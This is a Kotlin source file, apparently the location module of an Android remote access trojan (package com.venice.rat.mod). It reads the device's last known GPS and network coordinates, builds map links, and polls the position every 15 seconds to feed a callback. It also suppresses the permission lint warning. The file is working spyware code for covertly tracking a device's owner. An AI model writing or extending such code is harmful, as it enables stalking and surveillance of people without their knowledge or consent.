package com.venice.rat.mod

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationManager

@SuppressLint("MissingPermission")
object Loc {
    fun last(ctx: Context): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val sb = StringBuilder()
        listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER).forEach { p ->
            runCatching {
                val l = lm.getLastKnownLocation(p) ?: return@runCatching
                sb.appendLine("$p: ${l.latitude},${l.longitude} acc=${l.accuracy}")
            }
        }
        return sb.toString().ifBlank { "no location (GPS on karo)" }
    }

    fun mapLink(la: Double, lo: Double) = "https://www.google.com/maps?q=$la,$lo"

    suspend fun track(ctx: Context, secs: Int, cb: suspend (Double, Double, Float) -> Unit) {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val end = System.currentTimeMillis() + secs * 1000L
        while (System.currentTimeMillis() < end) {
            runCatching {
                val l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (l != null) cb(l.latitude, l.longitude, l.accuracy)
            }
            kotlinx.coroutines.delay(15_000)
        }
    }
}
